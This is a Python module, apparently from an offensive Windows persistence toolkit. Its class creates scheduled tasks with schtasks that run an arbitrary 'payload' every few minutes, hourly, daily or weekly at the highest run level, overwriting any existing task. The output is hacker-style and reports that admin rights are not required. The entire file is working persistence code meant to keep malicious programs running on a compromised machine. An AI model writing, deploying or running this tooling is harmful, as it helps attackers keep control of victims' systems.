"""
Time-based scheduled task triggers (interval and daily)
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import (
    run_command,
    validate_payload_path,
    validate_time_format
)
from config import DEFAULT_INTERVAL_MINUTES, DEFAULT_DAILY_TIME


class ScheduleTrigger:
    """Handles time-based scheduled tasks"""
    
    def create_interval(self, task_name, payload_path, interval_minutes=DEFAULT_INTERVAL_MINUTES):
        """
        Create task that runs at regular intervals
        
        Args:
            task_name (str): Task name
            payload_path (str): Payload path
            interval_minutes (int): Interval in minutes
            
        Returns:
            dict: Installation result
        """
        print(f"[*] Creating interval-based scheduled task...")
        print(f"[*] Interval: Every {interval_minutes} minutes")
        
        # Validate payload
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        # Validate interval
        if interval_minutes < 1 or interval_minutes > 1440:
            print(f"[-] Invalid interval: Must be between 1-1440 minutes")
            return None
        
        # Create task using schtasks command
        command = (
            f'schtasks /Create /SC MINUTE /MO {interval_minutes} '
            f'/TN "{task_name}" /TR "{payload_path}" /F /RL HIGHEST'
        )
        
        result = run_command(command)
        
        if result['success']:
            print(f"[+] Scheduled task created successfully!")
            print(f"    Task Name: {task_name}")
            print(f"    Trigger: Every {interval_minutes} minutes")
            print(f"    Payload: {payload_path}")
            print(f"    Run Level: Highest Available")
            print(f"    Admin Required: No")
            
            return {
                'method': 'schedule_interval',
                'task_name': task_name,
                'trigger': f'every_{interval_minutes}_minutes',
                'interval': interval_minutes,
                'payload': payload_path,
                'requires_admin': False,
                'remove_command': f'schtasks /Delete /TN "{task_name}" /F'
            }
        else:
            print(f"[-] Failed to create task")
            if result.get('stderr'):
                print(f"    Error: {result['stderr']}")
            return None
    
    def create_daily(self, task_name, payload_path, time=DEFAULT_DAILY_TIME):
        """
        Create task that runs daily at specified time
        
        Args:
            task_name (str): Task name
            payload_path (str): Payload path
            time (str): Time in HH:MM format
            
        Returns:
            dict: Installation result
        """
        print(f"[*] Creating daily scheduled task...")
        print(f"[*] Time: {time} daily")
        
        # Validate payload
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        # Validate time format
        is_valid, error = validate_time_format(time)
        if not is_valid:
            print(f"[-] Invalid time: {error}")
            return None
        
        # Create task
        command = (
            f'schtasks /Create /SC DAILY /TN "{task_name}" '
            f'/TR "{payload_path}" /ST {time} /F /RL HIGHEST'
        )
        
        result = run_command(command)
        
        if result['success']:
            print(f"[+] Scheduled task created successfully!")
            print(f"    Task Name: {task_name}")
            print(f"    Trigger: Daily at {time}")
            print(f"    Payload: {payload_path}")
            print(f"    Run Level: Highest Available")
            print(f"    Admin Required: No")
            
            return {
                'method': 'schedule_daily',
                'task_name': task_name,
                'trigger': f'daily_{time}',
                'time': time,
                'payload': payload_path,
                'requires_admin': False,
                'remove_command': f'schtasks /Delete /TN "{task_name}" /F'
            }
        else:
            print(f"[-] Failed to create task")
            if result.get('stderr'):
                print(f"    Error: {result['stderr']}")
            return None
    
    def create_hourly(self, task_name, payload_path):
        """
        Create task that runs every hour
        
        Args:
            task_name (str): Task name
            payload_path (str): Payload path
            
        Returns:
            dict: Installation result
        """
        print(f"[*] Creating hourly scheduled task...")
        
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        command = (
            f'schtasks /Create /SC HOURLY /TN "{task_name}" '
            f'/TR "{payload_path}" /F /RL HIGHEST'
        )
        
        result = run_command(command)
        
        if result['success']:
            print(f"[+] Scheduled task created successfully!")
            print(f"    Task Name: {task_name}")
            print(f"    Trigger: Every hour")
            print(f"    Payload: {payload_path}")
            
            return {
                'method': 'schedule_hourly',
                'task_name': task_name,
                'trigger': 'hourly',
                'payload': payload_path,
                'requires_admin': False,
                'remove_command': f'schtasks /Delete /TN "{task_name}" /F'
            }
        else:
            print(f"[-] Failed to create task")
            return None
    
    def create_weekly(self, task_name, payload_path, day_of_week="MON", time="02:00"):
        """
        Create task that runs weekly
        
        Args:
            task_name (str): Task name
            payload_path (str): Payload path
            day_of_week (str): Day (MON, TUE, WED, THU, FRI, SAT, SUN)
            time (str): Time in HH:MM format
            
        Returns:
            dict: Installation result
        """
        print(f"[*] Creating weekly scheduled task...")
        print(f"[*] Day: {day_of_week} at {time}")
        
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        is_valid, error = validate_time_format(time)
        if not is_valid:
            print(f"[-] Invalid time: {error}")
            return None
        
        command = (
            f'schtasks /Create /SC WEEKLY /D {day_of_week} /TN "{task_name}" '
            f'/TR "{payload_path}" /ST {time} /F /RL HIGHEST'
        )
        
        result = run_command(command)
        
        if result['success']:
            print(f"[+] Scheduled task created successfully!")
            print(f"    Task Name: {task_name}")
            print(f"    Trigger: Weekly on {day_of_week} at {time}")
            print(f"    Payload: {payload_path}")
            
            return {
                'method': 'schedule_weekly',
                'task_name': task_name,
                'trigger': f'weekly_{day_of_week}_{time}',
                'day': day_of_week,
                'time': time,
                'payload': payload_path,
                'requires_admin': False,
                'remove_command': f'schtasks /Delete /TN "{task_name}" /F'
            }
        else:
            print(f"[-] Failed to create task")
            return None